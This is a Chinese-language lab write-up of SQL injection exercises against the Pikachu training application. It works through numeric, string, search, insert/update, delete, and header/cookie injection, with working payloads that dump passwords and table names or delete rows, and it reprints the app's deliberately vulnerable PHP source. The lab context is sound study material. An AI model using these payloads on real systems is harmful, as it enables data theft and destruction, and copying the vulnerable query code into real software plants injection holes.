GROUP BY 的分组连接成一个字符串# information_schema数据库; MySQL 自带信息数据库（视图），用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等# 其中，SCHEMATA 表(当前mysql实例中所有数据库的信息)，主要获取各个数据库名（SCHEMA_NAME）：select * from information_schema.SCHEMATA;# TABLES 表（表信息）涵括数据库名（TABLE_SCHEMA），数据表名（TABLE_NAME），表类型（TABLE_TYPE）等字段。# COLUMNS　表（列信息）涵括　数据库名（TABLE_SCHEMA），数据表名（TABLE_NAME），字段名（COLUMN_NAME）。# LIKE 操作符用于在 WHERE 字句中搜索列中的指定模式。select username,id,email from member where username like &#x27;%l%&#x27;# 通过通配符（%）进行模糊搜索，获取username字段中所有含‘l’的值。# LIMIT 操作符用于限制由 SELECT 语句返回的数据数量(记录数)# 下列语句限制显示5条结果的返回SELECT username FROM member LIMIT 5\n常见注入点数字型：user_id=$id字符型：user_id=&#x27;$id&#x27;搜索型：text LIKE &#x27;%&#123;$_GET[&#x27;search&#x27;]&#125;%&#x27;&quot;\n数字型注入(post)# 正常参数写入id=1&amp;submit=%E6%9F%A5%E8%AF%A2# and 1=1 不报错，and 1=2 报错，id为问题参数id=1 and 1=2&amp;submit=%E6%9F%A5%E8%AF%A2# SQL判断--单引号报错id=1&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2# 猜测全语句select username,email from member where id = $id\n# 源代码分析，好吧，这里解析挺好的if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;id&#x27;]!=null)&#123;    //这里没有做任何处理，直接拼到select里面去了,形成Sql注入    $id=$_POST[&#x27;id&#x27;];    $query=&quot;select username,email from member where id=$id&quot;;    $result=execute($link, $query);    //这里如果用==1,会严格一点    if(mysqli_num_rows($result)&gt;=1)&#123;        while($data=mysqli_fetch_assoc($result))&#123;            $username=$data[&#x27;username&#x27;];            $email=$data[&#x27;email&#x27;];            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;hello,&#123;$username&#125; your email is: &#123;$email&#125;&lt;/p&gt;&quot;;        &#125;    &#125;else&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的user id不存在，请重新输入！&lt;/p&gt;&quot;;    &#125;&#125;\n# 其他payload# 构造 OR 连接，显示所有返回记录id=1 or 1=1&amp;submit=%E6%9F%A5%E8%AF%A2# 猜语句返回的字段数：Unknown column &#x27;3&#x27; in &#x27;order clause&#x27;id=1 order by 3#&amp;submit=%E6%9F%A5%E8%AF%A2# 猜member表中存在的字段id=1 order by username&amp;submit=%E6%9F%A5%E8%AF%A2# 结合其他SQL语句，查询当前数据库名id=1 union select 1,database()&amp;submit=%E6%9F%A5%E8%AF%A2id=1 union select database(),1#&amp;submit=%E6%9F%A5%E8%AF%A2# 根据捕获的数据库名列出其下所有表id=1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;pikachu&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2id=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()&amp;submit=%E6%9F%A5%E8%AF%A2# 列出 member 表中所有字段id=1 union select 1,group_concat(column_name) from information_schema.columns where table_name = &#x27;member&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2# 不重复列出 member 表下 pw 字段的所有记录id=1 union select 1,pw from member&amp;submit=%E6%9F%A5%E8%AF%A2# 或列出所有电话号码id=1 union select 1,phonenum from member&amp;submit=%E6%9F%A5%E8%AF%A2# 列出 pikachu 库的 users 表下的所有密码id=1 union select 1,password from users&amp;submit=%E6%9F%A5%E8%AF%A2# 列出 mysql 库的 db 表下的 User 字段的所有记录id=1 union select 1,User from mysql.db&amp;submit=%E6%9F%A5%E8%AF%A2\n字符型注入(get)#　正常查询，返回所在记录的id 和 email 字段http://192.168.135.132:49154/vul/sqli/sqli_str.php?name=lucy&amp;submit=%E6%9F%A5%E8%AF%A2# 单引号报错192.168.135.132:49154/vul/sqli/sqli_str.php?name=lucy&#x27;&amp;submit=查询# &#x27;--+ 正常显示http://192.168.135.132:49154/vul/sqli/sqli_str.php?name=lucy&#x27;--+&amp;submit=%E6%9F%A5%E8%AF%A2# 加号正常显示http://192.168.135.132:49154/vul/sqli/sqli_str.php?name=lucy+&amp;submit=%E6%9F%A5%E8%AF%A2# 判断，name作为问题参数，具体SQL语句猜测SELECT id,email FROM member WHERE username = $name\n# 源代码分析# 输入“&#x27;”搜索，还真提示引号没闭合，得注意点报错# You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27;&#x27;&#x27; at line 1# 直接用‘--+’给他把后边的给注释吧if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;name&#x27;]!=null)&#123;    //这里没有做任何处理，直接拼到select里面去了    $name=$_GET[&#x27;name&#x27;];    //这里的变量是字符型，需要考虑闭合    $query=&quot;select id,email from member where username=&#x27;$name&#x27;&quot;;    $result=execute($link, $query);    if(mysqli_num_rows($result)&gt;=1)&#123;        while($data=mysqli_fetch_assoc($result))&#123;            $id=$data[&#x27;id&#x27;];            $email=$data[&#x27;email&#x27;];            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;your uid:&#123;$id&#125; your email is: &#123;$email&#125;&lt;/p&gt;&quot;;        &#125;    &#125;else&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;;    &#125;&#125;\n# payload# 执行当前所有查询操作http://192.168.135.132:49154/vul/sqli/sqli_str.php?name=lucyname=kobe&#x27; or 1=1--+&amp;submit=查询# 获取当前数据库下所有表名http://192.168.135.132:49154/vul/sqli/sqli_str.php?name=lucy&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema = database()--+&amp;submit=查询# 查询users表中所有字段http://192.168.135.132:49154/vul/sqli/sqli_str.php?name=lucy&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;--+&amp;submit=查询# 都类似 数字型注入(post) 的 payload，回去看看就好了\n搜索型注入# 查询所有用户名含&#x27;l&#x27;的记录http://192.168.135.132:49154/vul/sqli/sqli_search.php?name=l&amp;submit=%E6%90%9C%E7%B4%A2# 单引号依旧报错http://192.168.135.132:49154/vul/sqli/sqli_search.php?name=r&#x27;&amp;submit=%641c%7d22# 搜索框直接输入 &#x27; order by 2# 判字段，得查询字段为2个http://192.168.135.132:49154/vul/sqli/sqli_search.php?name=%27+order+by+2%23&amp;submit=%E6%90%9C%E7%B4%A2# 直接输入搜索框# 列 users 表字段&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;## 列所有password 记录&#x27; union select 1,2,password from users#&#x27; union select 1,2,group_concat(password) from users#\n# 分析源码# 输入 &#x27; 报错：# You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;%&#x27;&#x27; at line 1# 构造闭合 &#x27;&#x27;%# 阿巴阿巴啊吧，插不进语句，直接注释吧# 嘻嘻，多试试总是好的，闭合成功# i&#x27; UNION SELECT TABLE_SCHEMA,TABLE_NAME,TABLE_TYPE FROM information_schema.TABLES WHERE TABLE_TYPE LIKE &#x27;%if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;name&#x27;]!=null)&#123;    //这里没有做任何处理，直接拼到select里面去了    $name=$_GET[&#x27;name&#x27;];    //这里的变量是模糊匹配，需要考虑闭合    $query=&quot;select username,id,email from member where username like &#x27;%$name%&#x27;&quot;;    $result=execute($link, $query);    if(mysqli_num_rows($result)&gt;=1)&#123;        //彩蛋:这里还有个xss        $html2.=&quot;&lt;p class=&#x27;notice&#x27;&gt;用户名中含有&#123;$_GET[&#x27;name&#x27;]&#125;的结果如下：&quot;;        while($data=mysqli_fetch_assoc($result))&#123;            $uname=$data[&#x27;username&#x27;];            $id=$data[&#x27;id&#x27;];            $email=$data[&#x27;email&#x27;];            $html1.=&quot;&lt;p class=&#x27;notice&#x27;&gt;username：&#123;$uname&#125;uid:&#123;$id&#125; email is: &#123;$email&#125;&lt;/p&gt;&quot;;        &#125;    &#125;else&#123;        $html1.=&quot;&lt;p class=&#x27;notice&#x27;&gt;0o。..没有搜索到你输入的信息！&lt;/p&gt;&quot;;    &#125;&#125;\nxx型注入# 万能的单引号http://192.168.135.132:49154/vul/sqli/sqli_x.php?name=%27&amp;submit=%E6%9F%A5%E8%AF%A2# 瞅下报错：# # You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27;&#x27;)&#x27; at line 1# 小括号这是没闭合？闭合并注释后面，得到构造 &#x27;)## 提示：您输入的username不存在，请重新输入！# 加点数据，构造 &#x27;) order by 2## 还是提示：您输入的username不存在，请重新输入！# 把2改成3，哦豁，字段爆出来了：Unknown column &#x27;3&#x27; in &#x27;order clause&#x27;\n# 源码# 比对Navicat中进行的实验。#　select id,email from member where username=(&#x27;&#x27;&#x27;)# &gt; 1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27;&#x27;)&#x27; at line 1# &gt; 时间: 0s# 可以看到，&#x27;&#x27;&#x27;&#x27;)&#x27; 可以拆分为 ‘&#x27;&#x27;&#x27;)’，在Navicat中可以明显看到 &#x27;&#x27;&#x27;) 是有问题的，即没闭合造成报错。# &#x27;&#x27;：指定字符串，无法在其中再使用通配符# 构造闭合# lucy&#x27;) UNION SELECT username,pw FROM member WHERE id=(&#x27;2# 完整语句#select id,email from member where username=(&#x27;lucy&#x27;) UNION SELECT username,pw FROM member WHERE id=(&#x27;2&#x27;)if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;name&#x27;]!=null)&#123;    //这里没有做任何处理，直接拼到select里面去了    $name=$_GET[&#x27;name&#x27;];    //这里的变量是字符型，需要考虑闭合    $query=&quot;select id,email from member where username=(&#x27;$name&#x27;)&quot;;    $result=execute($link, $query);    if(mysqli_num_rows($result)&gt;=1)&#123;        while($data=mysqli_fetch_assoc($result))&#123;            $id=$data[&#x27;id&#x27;];            $email=$data[&#x27;email&#x27;];            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;your uid:&#123;$id&#125; your email is: &#123;$email&#125;&lt;/p&gt;&quot;;        &#125;    &#125;else&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;;    &#125;&#125;\n“insert&#x2F;update”注入# 正常登录http://192.168.135.132:49154/vul/sqli/sqli_iu/sqli_login.php?username=admin&amp;password=admin&amp;submit=Login# 试了下，注入不了，转战注册username=admin&amp;password=admin&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit# 赏密码一个单引号，又来了。username=admin&amp;password=&#x27;&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit# 多个分号表示各个注册参数# 报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27;&#x27;),&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;)&#x27; at line 1# 赏账号一个单引号username=&#x27;admin&amp;password=tumei&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit# 报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;admin&#x27;,md5(&#x27;tumei&#x27;),&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;)&#x27; at line 1# 试下加#号username=admin&amp;password=&#x27;#&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit# 报错：You have an error in0 your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1# 查看系统版本username=test&#x27;  or updatexml(1,concat(0x7e,(select @@version),0x7e),0) or &#x27;&amp;password=ada&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit# 报错：XPATH syntax error: &#x27;~5.7.26-0ubuntu0.18.04.1-log~&#x27;# 查看数据库用户username=test&#x27;  or updatexml(0,concat(0x7e,(select user()) ,0x7e)  ,0) or &#x27;&amp;password=ada&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit# 报错：XPATH syntax error: &#x27;~root@localhost~&#x27;# 拿当前数据库名username=test&#x27;  or updatexml(1,concat(0x7e,database(),0x7e),0) or &#x27;&amp;password=ada&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit# 报错：XPATH syntax error: &#x27;~pikachu~&#x27;# 注册时使用到的数据表username=test&#x27;  or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27;),0x7e),0) or &#x27;&amp;password=ada&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit# 报错：Truncated incorrect DOUBLE value: &#x27;test&#x27;\n# 函数解析# UPDATEXML (XML_document, XPath_string, new_value);# 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc# 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。# 第三个参数：new_value，String格式，替换查找到的符合条件的数据# 作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值# 举例# 爆系统版本updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)# concat()函数是mysql的字符串连接函数，使用时，16进制也将自动转义，如0x7e是 ~ 符号# 用concat+updatexml注入时，通常加上16进制的连接符(如0x7e)，使返回内容的完全显示# 因此不会符合XPATH_string的格式，从而出现格式错误，爆出XPATH syntax error: &#x27;~5.7.26-0ubuntu0.18.04.1-log~&#x27;# 不加0x7e试试，没问题呀，当个习惯吧，&#x27;delete&#x27;注入中的解析讲有，制造不正确的路径updatexml(1,concat((SELECT @@version)),1)        # 由于代码执行后没有回显，需要采用报错注入# xpath语法错误# 如下方法的返回值均为写入非法格式内容，其返回内容即为需要查询结果# extractvalue()\t# 查询XML文档的函数# extractvalue(目标xml文档，xml路径)# extractvalue()能查询字符串的最大长度为32；若超过，则使用substring()函数截取# 路径为‘/a’得到正常返回，为‘/a/’得到报错返回，如下select * from member where username=&#x27;&#x27;  AND extractvalue(1,&#x27;/a/&#x27;);# 查询当前数据库select * from member where username=&#x27;&#x27;  AND extractvalue(1,CONCAT(1,DATABASE()));# 查询pikachu数据库下所有表，其中使用substring()函数进行截取select * from member where username=&#x27;&#x27;  AND extractvalue(1,concat(0x7e,(select subString(GROUP_CONCAT(table_name),1,8) from information_schema.tables where table_schema=&#x27;pikachu&#x27;),0x7e));# 返回：XPATH syntax error: &#x27;~httpinfo~&#x27;# 截取后半部分未显示的表名select * from member where username=&#x27;&#x27;  AND extractvalue(1,concat(0x7e,(select subString(GROUP_CONCAT(table_name),15,32) from information_schema.tables where table_schema=&#x27;pikachu&#x27;),0x7e));# 返回：XPATH syntax error: &#x27;~r,message,users,xssblind~&#x27;# updatexml()\t\t\t# 更新xml文档的函数# updatexml(目标xml文档，xml路径，更新的内容)# 正常使用select * from member where username=&#x27;&#x27;  or updatexml(1,&#x27;/a&#x27;,&#x27;admin&#x27;);# updatexml(1,&#x27;/a&#x27;,&#x27;admin&#x27;) 返回true，若路径为‘/a/’将触发报错机制，如下为报错结果# XPATH syntax error: &#x27;&#x27;# 写入&#x27;  or updatexml(1,concat(0x7e,(select @@version),0x7e),0);select * from member where username=&#x27;&#x27;  or updatexml(1,concat(0x7e,(select @@version),0x7e),0);# 报错返回:XPATH syntax error: &#x27;~5.7.26-0ubuntu0.18.04.1-log~&#x27;# 查询pikachu数据库下的所有表，其中使用了GROUP_CONCAT()多行显示问题(Subquery returns more than 1 row)select * from member where username=&#x27;&#x27;  or updatexml(1,concat(0x7e,(select GROUP_CONCAT(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27;),0x7e),0);# 返回结果：XPATH syntax error: &#x27;~httpinfo,member,message,users,x&#x27;# 对比数据库可知，返回结果的x全文应为xssblind，# 多次比对，结果显而易见select email from member where username=&#x27;&#x27;  or updatexml(1,concat(0x7e,(select GROUP_CONCAT(username) FROM member),0x7e),1);# 通过SUBSTRING()方法获取后半部分，一次最多显示32个字符，为保证lucy的完整性，从30位开始select email from member where username=&#x27;&#x27;  or updatexml(1,concat(0x7e,(select SUBSTRING(GROUP_CONCAT(username),30,32) FROM member),0x7e),1);# 结果：&gt; 1105 - XPATH syntax error: &#x27;~lucy,lili,admin,admin,admin1,ro&#x27;### exp() 溢出报错注入# 该函数以e为底的指数函数，在参数大于709时溢出报错select exp(710);# &gt; DOUBLE value is out of range in &#x27;exp(710)&#x27;select ~0; # 将0按位取反就会返回“18446744073709551615”select ~(select version());\t# 显示数据库版本，并将之按位取反得到“18446744073709551610”# 子查询结合按位求反，造成DOUBLE overflow error，并借由此注出数据。# 呃……这里有些懵，看其他师傅的解析也还是懵，后边再看吧select exp(~(select * from(select database())x));# 报错：DOUBLE value is out of range in &#x27;exp(~((select `x`.`database()` from (select database() AS `database()`) `x`)))&#x27;# 好吧，当前版本mysql数据库（5.7.26-0ubuntu0.18.04.1-log）无法实现报错，5.5.42版本的EXP() 函数可以实现报错注入# 发现一个报错显示当前数据库名的方法select * from a # &gt; 1146 - Table &#x27;pikachu.a&#x27; doesn&#x27;t exist       \n# 登录部分源码# connect() 方法# 打开一个非持久的 MySQL 连接# 返回一个代表到 MySQL 服务器的连接对象# escape() 方法# 该方法不会对 ASCII 字母和数字进行编码，也不会对一下 ASCII 标点符号进行编码： * @ - _ + . / 。其他所有的字符都会被转义序列替换。# 返回编码字符串，或者在失败时返回 FALSE。# execute() 方法# 执行已经预处理过的语句，并且只是返回执行结果成功或失败# mysqli_num_rows() 函数# 返回结果集中行的数量# mysqli_fetch_assoc() 函数# 从结果集中取得一行作为关联数组$link=connect();if(isset($_GET[&#x27;submit&#x27;]))&#123;    if($_GET[&#x27;username&#x27;]!=null &amp;&amp; $_GET[&#x27;password&#x27;]!=null)&#123;        //转义，防注入        $username=escape($link, $_GET[&#x27;username&#x27;]);        $password=escape($link, $_GET[&#x27;password&#x27;]);        $query=&quot;select * from member where username=&#x27;$username&#x27; and pw=md5(&#x27;$password&#x27;)&quot;;        $result=execute($link, $query);        if(mysqli_num_rows($result)==1)&#123;            $data=mysqli_fetch_assoc($result);            $_SESSION[&#x27;sqli&#x27;][&#x27;username&#x27;]=$username;            $_SESSION[&#x27;sqli&#x27;][&#x27;password&#x27;]=sha1(md5($password));            header(&quot;location:sqli_mem.php&quot;);        &#125;else&#123;            $html.=&quot;&lt;p&gt;登录失败,请重新登录&lt;/p&gt;&quot;;        &#125;    &#125;&#125;# 注册部分源码# isset() 函数# 用于检测变量是否已设置并且非 NULL。# mysqli_affected_rows() 函数# 返回前一次 MySQL 操作（SELECT、INSERT、UPDATE、REPLACE、DELETE）所影响的记录行数。$link=connect();$html=&#x27;&#x27;;if(isset($_POST[&#x27;submit&#x27;]))&#123;    if($_POST[&#x27;username&#x27;]!=null &amp;&amp;$_POST[&#x27;password&#x27;]!=null)&#123;//      $getdata=escape($link, $_POST);//转义        //没转义,导致注入漏洞,操作类型为insert        $getdata=$_POST;        $query=&quot;insert into member(username,pw,sex,phonenum,email,address) values(&#x27;&#123;$getdata[&#x27;username&#x27;]&#125;&#x27;,md5(&#x27;&#123;$getdata[&#x27;password&#x27;]&#125;&#x27;),&#x27;&#123;$getdata[&#x27;sex&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;phonenum&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;email&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;add&#x27;]&#125;&#x27;)&quot;;        $result=execute($link, $query);        if(mysqli_affected_rows($link)==1)&#123;            $html.=&quot;&lt;p&gt;注册成功,请返回&lt;a href=&#x27;sqli_login.php&#x27;&gt;登录&lt;/a&gt;&lt;/p&gt;&quot;;        &#125;else &#123;            $html.=&quot;&lt;p&gt;注册失败,请检查下数据库是否还活着&lt;/p&gt;&quot;;        &#125;    &#125;else&#123;        $html.=&quot;&lt;p&gt;必填项不能为空哦&lt;/p&gt;&quot;;    &#125;&#125;\n“delete”注入# 查看所有链接可以看到，是通过id进行留言的删除http://192.168.135.130:49154/vul/sqli/sqli_del.php?id=59# 引号测试报错# &gt; 1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27; at line 2# or 1=1 制造永真式删除 message 表中所有数据delete from message where id=58 OR 1=1;# 返回：&gt; Affected rows: 2# 结合 updatexml 函数进行报错注入# or updatexml(1,concat(0x7e,(select GROUP_CONCAT(username) FROM member),0x7e),0)delete from message where id=58 or updatexml(1,concat(0x7e,(select GROUP_CONCAT(username) FROM member),0x7e),0);# 结合 extractvalue() 函数进行报错注入# or extractvalue(1,concat(0x7e,(select GROUP_CONCAT(TABLE_SCHEMA) FROM information_schema.TABLES ),0x7e)) 进行查所有数据库名操作delete from message where id=58 or extractvalue(1,concat(0x7e,(select GROUP_CONCAT(TABLE_SCHEMA) FROM information_schema.TABLES ),0x7e));# GROUP_CONCAT() 函数的最大允许结果长度（以字节为单位），默认值为1024，超过直接报截断错误：&gt; 1260 - Row 54 was cut by GROUP_CONCAT()#使用 DISTINCT 关键字干掉重复值# DISTINCT 关键字与 SELECT 语句一起使用，来消除所有重复的记录，并只获取唯一一次记录，但效果似乎不是很好delete from message where id=58 AND extractvalue(1,concat(0x7e,(select GROUP_CONCAT(distinct TABLE_SCHEMA) FROM information_schema.TABLES),0x7e))# 报错结果：&gt; 1105 - XPATH syntax error: &#x27;~information_schema,mysql,perfor&#x27;# 使用 LIMIT 子句限制 SELECT 语句中查询的数据的数量，使用 OFFSET 子句设置偏移量（偏移量0开始计算）delete from message where id=58 AND extractvalue(1,concat(0x7e,(select TABLE_SCHEMA FROM information_schema.TABLES LIMIT 1 OFFSET 205),0x7e))# 返回结果：&gt; 1105 - XPATH syntax error: &#x27;~sys~&#x27;# 但有个问题，这个偏移量需要设置的有点多呀，还是需要用到 DISTINCT 关键字干掉重复值delete from message where id=58 AND extractvalue(1,concat(0x7e,(select DISTINCT TABLE_SCHEMA FROM information_schema.TABLES LIMIT 1 OFFSET 1),0x7e))# 简单解析下上面的 sql 语句# 1.通过 AND 关键字实现多个语句的使用# 2.通过 extractvalue 函数进行报错，其返回结果位不正确的参数# 3.通过 concat 函数进行字符串的连接，主要为 extractvalue 函数提供不正确的参数（0x7e的作用）# 4.通过 DISTINCT 关键字获取 TABLE_SCHEMA 字段所有记录的唯一值# 5.通过 LIMIT 关键字限制查找单条记录# 6.通过 OFFSEC 关键字设置偏移量，打破了1 row报错，实现查询整个表                    # 想起之前用到的 SUBSTRING 关键字，对字符串进行提取！每次查找获得一次，先说一下思路，使用 DISTINCT 关键字对查找字段进行去重，然后使用 GROUP_CONCAT 方法成组，当过长则使用 SUBSTRING 方法进行截取显示select GROUP_CONCAT( DISTINCT TABLE_SCHEMA) FROM information_schema.TABLES;# 现在的问题，前两步可以实现，但接入第三步只显示第一个数据库。？？可以了，好吧，多试试，可能是哪个字符写错了select SUBSTRING(GROUP_CONCAT( DISTINCT TABLE_SCHEMA),32,32) FROM information_schema.TABLES;# 当前题目的语句# 写入or extractvalue(1,concat(0x7e,(select SUBSTRING(GROUP_CONCAT( DISTINCT TABLE_SCHEMA),32,32) FROM information_schema.TABLES),0x7e))# 完整sql语句delete from message where id=58 or extractvalue(1,concat(0x7e,(select SUBSTRING(GROUP_CONCAT( DISTINCT TABLE_SCHEMA),32,32) FROM information_schema.TABLES),0x7e),1)# 报错结果：XPATH syntax error: &#x27;~mance_schema,pikachu,pkxss,sys~&#x27;         \n# 源码# array_key_exists() 函数# 检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。# mysqli_affected_rows() 函数# 返回前一次 MySQL 操作（SELECT、INSERT、UPDATE、REPLACE、DELETE）所影响的记录行数。$link=connect();$html=&#x27;&#x27;;if(array_key_exists(&quot;message&quot;,$_POST) &amp;&amp; $_POST[&#x27;message&#x27;]!=null)&#123;    //插入转义    $message=escape($link, $_POST[&#x27;message&#x27;]);    $query=&quot;insert into message(content,time) values(&#x27;$message&#x27;,now())&quot;;    $result=execute($link, $query);    if(mysqli_affected_rows($link)!=1)&#123;        $html.=&quot;&lt;p&gt;出现异常，提交失败！&lt;/p&gt;&quot;;    &#125;&#125;// if(array_key_exists(&#x27;id&#x27;, $_GET) &amp;&amp; is_numeric($_GET[&#x27;id&#x27;]))&#123;//没对传进来的id进行处理，导致DEL注入if(array_key_exists(&#x27;id&#x27;, $_GET))&#123;    $query=&quot;delete from message where id=&#123;$_GET[&#x27;id&#x27;]&#125;&quot;;    $result=execute($link, $query);    if(mysqli_affected_rows($link)==1)&#123;        header(&quot;location:sqli_del.php&quot;);    &#125;else&#123;        $html.=&quot;&lt;p style=&#x27;color: red&#x27;&gt;删除失败,检查下数据库是不是挂了&lt;/p&gt;&quot;;    &#125;&#125;\n“http header”注入# 真·见框就x# 太菜了，看下提示：admin/123456# 好了，中招了# 朋友，你好，你的信息已经被记录了：点击退出你的ip地址:192.168.135.128你的user agent:Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36你的http accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8你的端口（本次连接）:tcp50042\n# 已被记录User-agents等信息！这是与数据库交互了呗# 先抓个包分析登录请求，User-Agent和Accept、ip、port参数可控# 再比对下数据库，确实了。记下数据库路劲：pikachu/httpinfo# 登录时请求# POST /vul/sqli/sqli_header/sqli_header_login.php HTTP/1.1Host: 192.168.135.130:49154User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://192.168.135.130:49154/vul/sqli/sqli_header/sqli_header_login.phpCookie: PHPSESSID=lc7ll418j82rovatgm64brnf5jDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 42username=admin&amp;password=123456&amp;submit=Login\n# 憨憨如我，一直尝试登录界面的请求，而没在意登陆成功后的响应# 这不就来了吗# # You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,&#x27;51013&#x27;)&#x27; at line 1# # 登录成功后的响应GET /vul/sqli/sqli_header/sqli_header.php HTTP/1.1Host: 192.168.135.130:49154User-Agent: &#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=lc7ll418j82rovatgm64brnf5jDNT: 1Connection: closeUpgrade-Insecure-Requests: 1\n# payload 和前面的基本一样，整个经典滴例子# 请求# GET /vul/sqli/sqli_header/sqli_header.php HTTP/1.1Host: 192.168.135.130:49154User-Agent: tumei&#x27; and updatexml(1,concat(0x7e,database()),0) and &#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=lc7ll418j82rovatgm64brnf5jDNT: 1Connection: closeUpgrade-Insecure-Requests: 1# # 部分响应        &lt;div class=&quot;sidebar-toggle sidebar-collapse&quot; id=&quot;sidebar-collapse&quot;&gt;            &lt;i id=&quot;sidebar-toggle-icon&quot; class=&quot;ace-icon fa fa-angle-double-left ace-save-state&quot; data-icon1=&quot;ace-icon fa fa-angle-double-left&quot; data-icon2=&quot;ace-icon fa fa-angle-double-right&quot;&gt;&lt;/i&gt;        &lt;/div&gt;    &lt;/div&gt;XPATH syntax error: &#x27;~pikachu&#x27;\n# 其他注入点# 试了下，仅有UA和Accept可进行注入，对Host进行注入你猜能连得上吗# GET /vul/sqli/sqli_header/sqli_header.php HTTP/1.1Host: 192.168.135.130:49154User-Agent:0xtlu.meAccept:  tumei&#x27; and updatexml(1,concat(0x7e,database()),0) and &#x27;Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=lc7ll418j82rovatgm64brnf5jDNT: 1Connection: closeUpgrade-Insecure-Requests: 1# # 报错响应XPATH syntax error: &#x27;~pikachu&#x27;# # # # cookie 注入# 再看一眼后台请求，这cookie有点意思，直接用ant数组存储账密，这是与数据库交互了吧# Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=lc7ll418j82rovatgm64brnf5j# 试一波单引号，阔以；报错注入，哦豁# GET /vul/sqli/sqli_header/sqli_header.php HTTP/1.1Host: 192.168.135.130:49154User-Agent:0xtlu.meAccept:  0xtlu.meAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: ant[uname]=admin&#x27; or updatexml(9, concat(&#x27;~&#x27;, database(), &#x27;~&#x27;),0) or &#x27;; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=lc7ll418j82rovatgm64brnf5jDNT: 1Connection: 